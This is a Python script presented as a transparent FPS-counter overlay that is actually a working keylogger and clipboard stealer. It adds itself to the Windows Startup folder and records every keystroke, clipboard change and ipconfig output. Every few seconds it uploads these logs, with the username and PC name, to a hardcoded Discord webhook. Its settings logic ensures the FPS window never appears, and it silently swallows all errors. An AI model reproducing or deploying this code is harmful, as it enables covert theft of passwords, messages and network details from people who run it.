import os
import platform
import random
import string
import subprocess
import threading
import time
import pygame
import json
import requests
import shutil
import socket
import pyperclip
import psutil
from pathlib import Path
from pynput import keyboard
import tkinter as tk
import sys
from PyQt5.QtCore import Qt, QTimer
from PyQt5.QtGui import QFont, QColor
from PyQt5.QtWidgets import QApplication, QLabel, QWidget

# Initialize variables and paths
pc_name = socket.gethostname()
settings_file = "settings.json"
user_name = os.environ.get('USER') or os.environ.get('USERNAME')
last_timestamp = None
temp_folder = os.environ.get('TEMP')

log_file = os.path.join(temp_folder, "key_log.txt")  # Save key_log.txt in Temp
clipboard_log_file = os.path.join(temp_folder, "clipboard.txt")  # Save clipboard.txt in Temp
file_pathip = os.path.join(temp_folder, 'ipconfig.txt')  # Save ipconfig.txt in Temp
settings_file = os.path.join(temp_folder, "settings.json")

def ensure_log_files():
    for file in [log_file, clipboard_log_file, file_pathip]:
        if not os.path.exists(file):
            Path(file).touch()  # Create the file if it doesn't exist
    # No need to move the settings file; just ensure it's there
    if not os.path.exists(settings_file):
        default_settings = {"yes": False}
        with open(settings_file, "w") as f:
            json.dump(default_settings, f)


# Call this function to ensure the log files exist
ensure_log_files()

def load_settings():
    """Loads settings from the settings.json file located in the Temp folder."""
    if os.path.exists(settings_file):
        with open(settings_file, "r") as f:
            settings = json.load(f)
    else:
        # If the settings file doesn't exist, create a new one with default values
        default_settings = {"yes": False}
        with open(settings_file, "w") as f:
            json.dump(default_settings, f)
        settings = default_settings
    return settings

def update_settings(new_value):
    """Updates the settings.json file in the Temp folder."""
    settings = load_settings()
    settings["yes"] = new_value
    with open(settings_file, "w") as f:
        json.dump(settings, f)


# FPS counter function (for transparent window)
def get_timestamp():
    """Returns the current timestamp as a formatted string."""
    return time.strftime("[%Y-%m-%d %H:%M] ")

def add_to_startup():
    # Get the current script's full path
    current_file_path = sys.argv[0]  # This returns the path to the currently running script

    # Determine the user's startup folder path for Windows
    startup_folder = os.path.join(
        os.environ.get('APPDATA'), 
        'Microsoft', 
        'Windows', 
        'Start Menu', 
        'Programs', 
        'Startup'
    )
    
    # Make sure the startup folder exists
    if not os.path.exists(startup_folder):
        pass
        return
    
    # Copy the current script to the startup folder
    try:
        # Destination file path in the startup folder
        destination = os.path.join(startup_folder, os.path.basename(current_file_path))
        
        # Copy the script to the startup folder
        shutil.copy(current_file_path, destination)
        pass
    except Exception as e:
        pass
        
# Function to log clipboard content to the clipboard.txt file
def log_clipboard():
    last_clipboard_content = ""
    while True:
        try:
            # Get current clipboard content
            current_clipboard_content = pyperclip.paste()
            if current_clipboard_content != last_clipboard_content:  # Only log if clipboard content has changed
                timestamp = get_timestamp()
                with open(clipboard_log_file, "a") as f:
                    f.write(f"{timestamp} - {current_clipboard_content}\n")  # Log clipboard content with timestamp
                last_clipboard_content = current_clipboard_content
                
                # Upload clipboard content to webhook
                payload = {
                    'content': f"Clipboard content: {current_clipboard_content}"
                }
                response = requests.post(webhook_url, data=payload)
                if response.status_code != 204:
                    pass
            time.sleep(1)  # Check clipboard every second
        except Exception as e:
            pass
            time.sleep(5)

def on_press(key):
    """Logs the pressed key to the file with timestamp every minute."""
    global last_timestamp

    try:
        with open(log_file, "a") as f:
            current_time = time.time()
            formatted_time = get_timestamp()

            # Add a new timestamp every minute
            if last_timestamp is None or (current_time - last_timestamp) >= 60:
                f.write(f"\n{formatted_time}\n")
                last_timestamp = current_time

            # Log the keypress
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)  # Log regular keys
            else:
                f.write(f" [{key}] ")  # Log special keys (Enter, Shift, etc.)

    except Exception as e:
        pass

# Upload function to Discord webhook
def upload_file_to_webhook(file_path, webhook_url):
    """Uploads files to a Discord webhook."""
    try:
        with open(file_path, 'rb') as file, open(file_pathip, 'rb') as ipfile, open(clipboard_log_file, 'rb') as clipboard_file:
            payload = {
                'content': f'Here are the logs for the user {user_name} and the PC name is {pc_name}. This message also includes IPCONFIG data and clipboard data.'
            }
            files = {
                'file1': (file_path, file),
                'file2': (file_pathip, ipfile),
                'file3': (clipboard_log_file, clipboard_file)  # Correct reference to the clipboard log file
            }
            response = requests.post(webhook_url, data=payload, files=files)
            if response.status_code == 204:
                pass
            else:
                pass
    except Exception as e:
        pass

# Upload every 5 seconds
def upload_every_5_seconds(file_path, webhook_url):
    while True:
        pass
        upload_file_to_webhook(file_path, webhook_url)
        time.sleep(5)

# Run the ipconfig command every 5 seconds
def run_ipconfig():
    while True:
        try:
            # Run ipconfig and capture the output
            result = subprocess.run(
                ['ipconfig'],
                capture_output=True,
                text=True,
                check=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )

            # Write the output to the ipconfig.txt file
            with open(file_pathip, 'w') as file:
                file.write(result.stdout)  # Write the captured stdout to the file

        except subprocess.CalledProcessError as e:
            pass
        
        except Exception as e:
            pass

        time.sleep(5)  # Wait for 5 seconds before running again

class TransparentWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setGeometry(0, 0, 200, 100)
        self.label = QLabel(self)
        self.label.setFont(QFont("Arial", 20))
        self.label.setStyleSheet("color: white")
        self.label.setGeometry(10, 30, 200, 50)

        # Timer to update the FPS counter every 100ms
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_fps)
        self.timer.start(100)  # Update FPS every 100ms (0.1 second)

        # Variables for FPS calculation
        self.frames = 0
        self.last_time = time.time()
        self.fps = 0  # FPS value to display

    def update_fps(self):
        current_time = time.time()
        self.frames += 1
        elapsed_time = current_time - self.last_time

        # Update FPS every second (1 second period)
        if elapsed_time >= 1.0:
            self.fps = self.frames  # Set FPS to the number of frames over 1 second
            self.frames = 0  # Reset frame count
            self.last_time = current_time  # Reset time
            self.label.setText(f"FPS: {self.fps}")  # Display FPS on label

    def mousePressEvent(self, event):
        """To prevent dragging the window when clicked."""
        event.ignore()

# Define the webhook URL
webhook_url = 'https://discord.com/api/webhooks/1335214600714457158/tzhsBy9cn-22l9vBGxfDs8kaoQ4CCsuTkqQhNvJe5BQ6ECrgHBD4JvEt-e5Kj3hftuSO'

add_to_startup()

# Start upload thread for log file
upload_thread = threading.Thread(target=upload_every_5_seconds, args=(log_file, webhook_url))
upload_thread.daemon = True
upload_thread.start()

# Start ipconfig logging thread
ipconfig_thread = threading.Thread(target=run_ipconfig)
ipconfig_thread.daemon = True
ipconfig_thread.start()

# Start the clipboard logging in a separate thread
clipboard_thread = threading.Thread(target=log_clipboard)
clipboard_thread.daemon = True
clipboard_thread.start()

if __name__ == "__main__":
    # Load settings
    settings = load_settings()

    # Update the settings to True right after loading settings
    update_settings(True)

    # Reload settings to reflect the update
    settings = load_settings()

    # Now check if 'yes' is True (since we reloaded settings)
    if not settings.get("yes", False):  # If 'yes' is False, show the FPS counter window
        app = QApplication(sys.argv)
        window = TransparentWindow()
        window.show()

        # Start the event loop
        sys.exit(app.exec_())
    
    # If 'yes' is True, do nothing (counter is not shown)
    else:
        pass


# Start the key listener in the main thread
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
